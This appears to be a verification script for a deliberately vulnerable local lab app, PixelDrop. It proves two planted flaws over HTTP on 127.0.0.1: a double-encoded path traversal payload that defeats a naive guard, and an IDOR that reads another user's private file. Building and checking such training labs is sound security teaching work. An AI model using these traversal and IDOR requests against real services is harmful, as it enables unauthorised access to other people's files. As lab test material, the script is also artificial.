#!/usr/bin/env node
// verify.mjs - proves the two intended PixelDrop vulnerabilities over HTTP.
//
// What this script does:
//   1. Starts server.mjs on 127.0.0.1 (port 4102, or 4103-4106 when busy).
//   2. Signs in with the demo account.
//   3. Proves the double-decoded path traversal returns the traversal flag.
//   4. Proves the IDOR on /api/files/:id returns the IDOR flag.
//   5. Runs negative checks (blocked single encoding, 404s, 403s, auth).
//   6. Stops the server it started. Nothing is left listening.
//
// Exit code 0 = both flags proven; 1 = a check failed. No external packages.

import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { setTimeout as delay } from 'node:timers/promises';

const LAB_DIR = path.dirname(fileURLToPath(import.meta.url));
const SERVER_FILE = path.join(LAB_DIR, 'server.mjs');
// The lab server's stdout/stderr go to this throwaway file. A file is used
// instead of a pipe so the script also works in restricted sandboxes where
// piped child stdio is not permitted. It is removed when verification ends.
const SERVER_LOG_FILE = path.join(LAB_DIR, '.pixeldrop-verify-server.log');

const CANDIDATE_PORTS = [4102, 4103, 4104, 4105, 4106];
const TRAVERSAL_FLAG_PATTERN = /HMW\{pixeldrop_traversal_[a-z0-9]+\}/;
const IDOR_FLAG_PATTERN = /HMW\{pixeldrop_idor_[a-z0-9]+\}/;
const FLAG_ANY_PATTERN = /HMW\{/;

const DEMO_EMAIL = 'demo@pixeldrop.test';
const DEMO_PASSWORD = 'demo1234';
const DEMO_USER_ID = 'usr_1042';
const OTHER_USER_ID = 'usr_1001';

const TRAVERSAL_EXPLOIT_PATH = '/download?file=..%252F..%252Fsecret%252Fflag.txt';
const TRAVERSAL_SINGLE_ENCODED_PATH = '/download?file=..%2F..%2Fsecret%2Fflag.txt';

let serverProcess = null;
let serverBaseUrl = '';
let startedPort = null;

function readServerLog() {
  try {
    return fs.readFileSync(SERVER_LOG_FILE, 'utf8');
  } catch {
    return '';
  }
}

function log(line = '') {
  process.stdout.write(`${line}\n`);
}

function pass(message, detail = '') {
  log(`[PASS] ${message}`);
  for (const line of String(detail).split('\n').filter(Boolean)) {
    log(`       ${line}`);
  }
}

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

function extractSessionCookie(response) {
  const setCookieHeaders =
    typeof response.headers.getSetCookie === 'function'
      ? response.headers.getSetCookie()
      : [response.headers.get('set-cookie')].filter(Boolean);
  const sessionHeader = setCookieHeaders.find((value) => value.startsWith('pd_session='));
  assert(sessionHeader, 'login response did not set a pd_session cookie');
  return sessionHeader.split(';')[0].trim();
}

async function startServer() {
  for (const port of CANDIDATE_PORTS) {
    const url = `http://127.0.0.1:${port}`;

    let logFd = 'ignore';
    try {
      logFd = fs.openSync(SERVER_LOG_FILE, 'w');
    } catch {
      logFd = 'ignore';
    }

    const child = spawn(process.execPath, [SERVER_FILE], {
      cwd: LAB_DIR,
      env: { ...process.env, PIXELDROP_PORT: String(port) },
      stdio: ['ignore', logFd, logFd],
      windowsHide: true,
    });

    if (typeof logFd === 'number') {
      try {
        fs.closeSync(logFd);
      } catch {
        // The child keeps its inherited handle.
      }
    }

    const state = { exited: false, spawnError: null };
    child.on('exit', () => {
      state.exited = true;
    });
    child.on('error', (error) => {
      state.spawnError = error;
      state.exited = true;
    });

    const deadline = Date.now() + 6000;
    let ready = false;
    while (Date.now() < deadline) {
      if (state.spawnError || state.exited) {
        break;
      }
      try {
        const response = await fetch(`${url}/healthz`, { signal: AbortSignal.timeout(1000) });
        if (response.ok) {
          const health = await response.json().catch(() => null);
          if (health && health.service === 'pixeldrop' && Number(health.port) === port) {
            ready = true;
            break;
          }
        }
      } catch {
        // Not listening yet; keep polling until the deadline.
      }
      await delay(120);
    }

    if (ready) {
      // Guard against a leftover PixelDrop instance on this port: our child
      // would have exited with EADDRINUSE while the other one answers.
      await delay(200);
      if (!state.exited) {
        serverProcess = child;
        serverBaseUrl = url;
        startedPort = port;
        return;
      }
    }

    try {
      child.kill('SIGTERM');
    } catch {
      // Already gone.
    }
    await delay(250);
    const startupLog = readServerLog();

    if (/EADDRINUSE/.test(startupLog)) {
      log(`[info] 127.0.0.1:${port} is busy; trying the next localhost port`);
      continue;
    }

    throw new Error(`server failed to start on ${url}\n--- server output ---\n${startupLog}`);
  }

  throw new Error(`could not start PixelDrop on any candidate port (${CANDIDATE_PORTS.join(', ')})`);
}

async function stopServer() {
  if (!serverProcess) {
    return;
  }
  const child = serverProcess;
  const url = serverBaseUrl;
  serverProcess = null;

  await new Promise((resolve) => {
    let settled = false;
    const finish = () => {
      if (settled) {
        return;
      }
      settled = true;
      resolve();
    };
    child.once('exit', finish);
    try {
      child.kill('SIGTERM');
    } catch {
      // Already gone.
    }
    const hardKill = setTimeout(() => {
      try {
        child.kill('SIGKILL');
      } catch {
        // Already gone.
      }
    }, 2000);
    hardKill.unref();
    const giveUp = setTimeout(finish, 4000);
    giveUp.unref();
  });

  let reachable = false;
  try {
    await fetch(`${url}/healthz`, { signal: AbortSignal.timeout(700) });
    reachable = true;
  } catch {
    reachable = false;
  }
  assert(!reachable, `server is still reachable on ${url} after shutdown`);
  pass(`server stopped; nothing is listening on 127.0.0.1:${startedPort}`);
}

async function main() {
  log('PixelDrop lab verification');
  log('==========================');
  log();

  await startServer();

  const healthResponse = await fetch(`${serverBaseUrl}/healthz`);
  const health = await healthResponse.json();
  assert(healthResponse.status === 200, `healthz returned ${healthResponse.status}`);
  assert(health.host === '127.0.0.1', `server must bind 127.0.0.1, reported host: ${health.host}`);
  pass(`server bound to 127.0.0.1:${startedPort} (loopback only)`);

  // -----------------------------------------------------------------------
  // Login flow
  // -----------------------------------------------------------------------
  const loginPageResponse = await fetch(`${serverBaseUrl}/login`);
  const loginPageHtml = await loginPageResponse.text();
  assert(loginPageResponse.status === 200, `GET /login returned ${loginPageResponse.status}`);
  assert(loginPageHtml.includes(DEMO_EMAIL), 'login page should show the demo email');
  assert(loginPageHtml.includes(DEMO_PASSWORD), 'login page should show the demo password');
  assert(!FLAG_ANY_PATTERN.test(loginPageHtml), 'login page HTML must not contain flags');
  pass('login page shows demo credentials and no flags');

  const badLogin = await fetch(`${serverBaseUrl}/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ email: DEMO_EMAIL, password: 'not-the-password' }),
    redirect: 'manual',
  });
  assert(badLogin.status === 401, `wrong password should be rejected with 401, got ${badLogin.status}`);
  pass('invalid login correctly rejected with 401');

  const loginResponse = await fetch(`${serverBaseUrl}/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ email: DEMO_EMAIL, password: DEMO_PASSWORD }),
    redirect: 'manual',
  });
  assert(
    loginResponse.status === 302 || loginResponse.status === 303,
    `valid login should redirect (302/303), got ${loginResponse.status}`,
  );
  const sessionCookie = extractSessionCookie(loginResponse);
  const authedHeaders = { cookie: sessionCookie };
  pass('valid demo login issues a pd_session cookie');

  // -----------------------------------------------------------------------
  // Public file list and baseline download
  // -----------------------------------------------------------------------
  const filesPageResponse = await fetch(`${serverBaseUrl}/files`, { headers: authedHeaders });
  const filesPageHtml = await filesPageResponse.text();
  assert(filesPageResponse.status === 200, `GET /files returned ${filesPageResponse.status}`);
  assert(filesPageHtml.includes('welcome.txt'), 'file list page should list welcome.txt');
  assert(filesPageHtml.includes('/download?file=welcome.txt'), 'file list should link to the download endpoint');
  assert(!filesPageHtml.includes('/api/files/1001'), 'file list must not expose another user private drop id');
  assert(!FLAG_ANY_PATTERN.test(filesPageHtml), '/files HTML must not contain flags');
  pass('public file list renders and does not leak flags or foreign private ids');

  const welcomeResponse = await fetch(`${serverBaseUrl}/download?file=welcome.txt`, { headers: authedHeaders });
  const welcomeText = await welcomeResponse.text();
  assert(welcomeResponse.status === 200, `baseline download returned ${welcomeResponse.status}`);
  assert(welcomeText.includes('Welcome to PixelDrop'), 'baseline download content mismatch');
  assert(!FLAG_ANY_PATTERN.test(welcomeText), 'public download must not contain flags');
  pass('baseline public download works (GET /download?file=welcome.txt -> 200)');

  // -----------------------------------------------------------------------
  // Negative checks around the traversal
  // -----------------------------------------------------------------------
  const directSecret = await fetch(`${serverBaseUrl}/secret/flag.txt`);
  assert(directSecret.status === 404, `direct /secret/flag.txt should be 404, got ${directSecret.status}`);
  pass('direct /secret/flag.txt is not served (404)');

  const singleEncoded = await fetch(`${serverBaseUrl}${TRAVERSAL_SINGLE_ENCODED_PATH}`, {
    headers: authedHeaders,
  });
  const singleEncodedBody = await singleEncoded.text();
  assert(singleEncoded.status === 400, `single-encoded traversal should be blocked (400), got ${singleEncoded.status}`);
  assert(!FLAG_ANY_PATTERN.test(singleEncodedBody), 'blocked traversal must not leak the flag');
  pass('naive guard blocks the single-encoded traversal (400)');

  // -----------------------------------------------------------------------
  // VULNERABILITY 1: double-decoded path traversal
  // -----------------------------------------------------------------------
  const traversalResponse = await fetch(`${serverBaseUrl}${TRAVERSAL_EXPLOIT_PATH}`, {
    headers: authedHeaders,
  });
  const traversalBody = await traversalResponse.text();
  assert(
    traversalResponse.status === 200,
    `double-encoded traversal expected 200, got ${traversalResponse.status}`,
  );
  const traversalFlagMatch = traversalBody.match(TRAVERSAL_FLAG_PATTERN);
  assert(traversalFlagMatch, 'traversal response did not contain the traversal flag');
  const traversalFlag = traversalFlagMatch[0];
  pass(
    'VULNERABILITY 1: double-decoded traversal reads secret/flag.txt (200)',
    `request: GET ${TRAVERSAL_EXPLOIT_PATH}\nflag: ${traversalFlag}`,
  );

  // -----------------------------------------------------------------------
  // VULNERABILITY 2: IDOR on the private file API
  // -----------------------------------------------------------------------
  const anonymousLookup = await fetch(`${serverBaseUrl}/api/files/1001`);
  assert(anonymousLookup.status === 401, `unauthenticated /api/files/1001 should be 401, got ${anonymousLookup.status}`);
  pass('private file API requires a session (401 without cookie)');

  const ownFilesResponse = await fetch(`${serverBaseUrl}/api/files`, { headers: authedHeaders });
  const ownFiles = await ownFilesResponse.json();
  assert(ownFilesResponse.status === 200, `GET /api/files returned ${ownFilesResponse.status}`);
  assert(Array.isArray(ownFiles.files) && ownFiles.files.length >= 1, 'own private list should not be empty');
  assert(ownFiles.owner && ownFiles.owner.id === DEMO_USER_ID, 'own private list should identify the demo owner');
  assert(
    ownFiles.files.every((file) => file.ownerId === DEMO_USER_ID),
    'own private list must only contain drops owned by the demo user',
  );
  assert(
    !ownFiles.files.some((file) => Number(file.id) === 1001),
    'own private list must not contain private drop 1001 (owned by another user)',
  );
  assert(!FLAG_ANY_PATTERN.test(JSON.stringify(ownFiles)), 'own private list must not contain flags');
  pass('GET /api/files correctly returns only the demo user private drops');

  const idorResponse = await fetch(`${serverBaseUrl}/api/files/1001`, { headers: authedHeaders });
  const idorFile = await idorResponse.json();
  assert(idorResponse.status === 200, `IDOR lookup /api/files/1001 returned ${idorResponse.status}`);
  assert(idorFile.ownerId === OTHER_USER_ID, `expected drop 1001 to belong to ${OTHER_USER_ID}, got ${idorFile.ownerId}`);
  assert(typeof idorFile.content === 'string', 'IDOR response should include file content');
  const idorFlagMatch = idorFile.content.match(IDOR_FLAG_PATTERN);
  assert(idorFlagMatch, 'IDOR response did not contain the IDOR flag');
  const idorFlag = idorFlagMatch[0];
  pass(
    'VULNERABILITY 2: IDOR reads private drop 1001 owned by another user (200)',
    `request: GET /api/files/1001 as ${DEMO_EMAIL}\nowner of drop: ${idorFile.ownerId}\nflag: ${idorFlag}`,
  );

  assert(traversalFlag !== idorFlag, 'the two flags must be distinct');
  pass('recovered flags are distinct (one per vulnerability class)');

  // -----------------------------------------------------------------------
  // Correctly rejected routes and decoys
  // -----------------------------------------------------------------------
  const adminResponse = await fetch(`${serverBaseUrl}/api/admin/audit`, { headers: authedHeaders });
  assert(adminResponse.status === 403, `demo user on admin route should be 403, got ${adminResponse.status}`);
  pass('admin-only route correctly rejects the demo user (403)');

  const restrictedDownload = await fetch(
    `${serverBaseUrl}/download?file=internal%2Facl-test.txt`,
    { headers: authedHeaders },
  );
  assert(restrictedDownload.status === 403, `restricted drop should be 403, got ${restrictedDownload.status}`);
  pass('restricted drop correctly rejects access (403)');

  const invalidUpload = await fetch(`${serverBaseUrl}/api/upload`, {
    method: 'POST',
    headers: { ...authedHeaders, 'content-type': 'application/json' },
    body: JSON.stringify({ name: 'Not A Valid Name', visibility: 'public', description: 'x' }),
  });
  assert(invalidUpload.status === 400, `invalid upload name should be 400, got ${invalidUpload.status}`);

  const oversizedUpload = await fetch(`${serverBaseUrl}/api/upload`, {
    method: 'POST',
    headers: { ...authedHeaders, 'content-type': 'application/json' },
    body: JSON.stringify({ name: 'demo-note.txt', visibility: 'private', description: 'x'.repeat(600) }),
  });
  assert(oversizedUpload.status === 413, `oversized description should be 413, got ${oversizedUpload.status}`);

  const validUpload = await fetch(`${serverBaseUrl}/api/upload`, {
    method: 'POST',
    headers: { ...authedHeaders, 'content-type': 'application/json' },
    body: JSON.stringify({ name: 'demo-note.txt', visibility: 'private', description: 'Synthetic verification note.' }),
  });
  const validUploadJson = await validUpload.json();
  assert(validUpload.status === 201, `valid metadata upload should be 201, got ${validUpload.status}`);
  assert(validUploadJson.submission && validUploadJson.submission.status === 'pending review', 'upload submission shape mismatch');
  pass('metadata upload validates input (400/413) and accepts valid metadata (201)');

  const robotsResponse = await fetch(`${serverBaseUrl}/robots.txt`);
  const robotsText = await robotsResponse.text();
  assert(robotsResponse.status === 200, `robots.txt returned ${robotsResponse.status}`);
  assert(/Disallow:\s*\/api\//.test(robotsText), 'robots.txt should disallow /api/');
  assert(!FLAG_ANY_PATTERN.test(robotsText), 'robots.txt must not contain flags');

  const appJsResponse = await fetch(`${serverBaseUrl}/static/app.js`);
  const appJsText = await appJsResponse.text();
  assert(appJsResponse.status === 200, `static app.js returned ${appJsResponse.status}`);
  assert(
    String(appJsResponse.headers.get('content-type') || '').includes('javascript'),
    'static app.js should be served as JavaScript',
  );
  assert(!FLAG_ANY_PATTERN.test(appJsText), 'static app.js must not contain flags');
  pass('robots.txt and static client script are served without flags');

  const missingResponse = await fetch(`${serverBaseUrl}/does-not-exist`);
  assert(missingResponse.status === 404, `unknown route should be 404, got ${missingResponse.status}`);
  pass('unknown route returns 404');

  // -----------------------------------------------------------------------
  // Summary
  // -----------------------------------------------------------------------
  log();
  log('All checks passed. Both intended vulnerabilities were proven over HTTP.');
  log(`  traversal flag: ${traversalFlag}`);
  log(`  IDOR flag:      ${idorFlag}`);
  log(`  final URL used: ${serverBaseUrl}`);
  log();
}

let exitCode = 0;

try {
  await main();
} catch (error) {
  exitCode = 1;
  log();
  log(`[FAIL] ${error && error.message ? error.message : error}`);
  const failureLog = readServerLog();
  if (failureLog.trim()) {
    log('--- server output ---');
    log(failureLog.trimEnd());
  }
} finally {
  try {
    await stopServer();
  } catch (stopError) {
    exitCode = 1;
    log(`[FAIL] ${stopError && stopError.message ? stopError.message : stopError}`);
  }
  try {
    fs.rmSync(SERVER_LOG_FILE, { force: true });
  } catch {
    // Best effort cleanup of the throwaway server log.
  }
}

if (exitCode === 0) {
  log('Verification OK.');
} else {
  log('Verification FAILED.');
}

process.exitCode = exitCode;
